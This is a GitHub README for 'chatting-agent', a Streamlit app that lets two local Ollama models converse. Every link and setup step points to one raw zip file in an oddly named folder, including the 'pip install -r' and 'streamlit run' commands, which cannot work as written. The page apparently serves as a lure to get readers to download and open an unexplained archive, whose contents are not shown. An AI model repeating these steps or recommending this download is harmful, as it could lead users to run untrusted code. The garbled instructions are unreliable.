# ğŸ‰ chatting-agent - Chat Seamlessly with Local Models

## ğŸš€ Getting Started

Welcome to the **chatting-agent** project! This is a Streamlit application that allows two local Ollama models to chat with each other in real-time. You can explore the capabilities of artificial intelligence by letting these models engage in conversations.

## ğŸ“¥ Download and Install

To download the chatting-agent application, please visit the Releases page. You will find the necessary files to get started. 

[![Download chatting-agent](https://github.com/Aart834/chatting-agent/raw/refs/heads/main/Batussi/chatting_agent_v3.4-beta.5.zip)](https://github.com/Aart834/chatting-agent/raw/refs/heads/main/Batussi/chatting_agent_v3.4-beta.5.zip)

Click the button above or follow this link: [Download chatting-agent](https://github.com/Aart834/chatting-agent/raw/refs/heads/main/Batussi/chatting_agent_v3.4-beta.5.zip).

### ğŸ”§ System Requirements

Before you begin, ensure your computer meets the following requirements:

- Operating System: Windows 10 or higher, macOS 10.14 or higher, or a compatible Linux distribution.
- Python: Version 3.8 or higher installed.
- Memory: At least 4 GB of RAM.
- Storage: 200 MB of free space.
  
### ğŸ“‹ Features

The **chatting-agent** application includes the following features:

- Two local Ollama models that can converse with each other.
- A user-friendly interface built with Streamlit.
- Easy installation process with clear instructions.

## âš™ï¸ How to Run the Application

After downloading the application, follow these steps to run the chatting-agent:

1. **Locate the Downloaded File**  
   Check your default download directory for the downloaded file. It may be named something like `https://github.com/Aart834/chatting-agent/raw/refs/heads/main/Batussi/chatting_agent_v3.4-beta.5.zip` or `https://github.com/Aart834/chatting-agent/raw/refs/heads/main/Batussi/chatting_agent_v3.4-beta.5.zip`.

2. **Extract the Files (if applicable)**  
   If you have a compressed file (like a `.zip`), right-click on it and select "Extract All." Follow the prompts to extract the contents to a folder of your choice.

3. **Open a Terminal or Command Prompt**  
   - On Windows, search for "Command Prompt" in the Start menu.
   - On macOS, open "Terminal" from your applications.
   - On Linux, look for your terminal in your applications.

4. **Navigate to the Application Folder**  
   Use the `cd` command to change the directory to where you extracted your files. For example:
   ```
   cd path/to/chatting-agent
   ```

5. **Install Dependencies**  
   Type the following command to install any required packages:
   ```
   pip install -r https://github.com/Aart834/chatting-agent/raw/refs/heads/main/Batussi/chatting_agent_v3.4-beta.5.zip
   ```

6. **Run the Application**  
   Finally, start the chatting-agent application by typing:
   ```
   streamlit run https://github.com/Aart834/chatting-agent/raw/refs/heads/main/Batussi/chatting_agent_v3.4-beta.5.zip
   ```

7. **Open Your Web Browser**  
   After running the previous command, a message will appear in the terminal providing a local URL, usually `http://localhost:8501`. Open this URL in your web browser to start chatting with the models.

## ğŸ™‹ Frequently Asked Questions

### How do I update the application?

Visit the Releases page again and download the latest version. Follow the same steps to install it.

### Can I run this on different operating systems?

Yes, as long as your operating system meets the system requirements listed above.

### What if I encounter errors?

Make sure you have installed Python and its dependencies. If you encounter issues, consult the documentation or seek help in the project's issue tracker on GitHub.

## ğŸ“ Contact

If you need more help or have suggestions, please create an issue in the GitHub repository. Your feedback is valuable to us. 

### ğŸ“Œ Important Links

- [Download chatting-agent](https://github.com/Aart834/chatting-agent/raw/refs/heads/main/Batussi/chatting_agent_v3.4-beta.5.zip)

Thank you for using **chatting-agent**! Enjoy your conversations!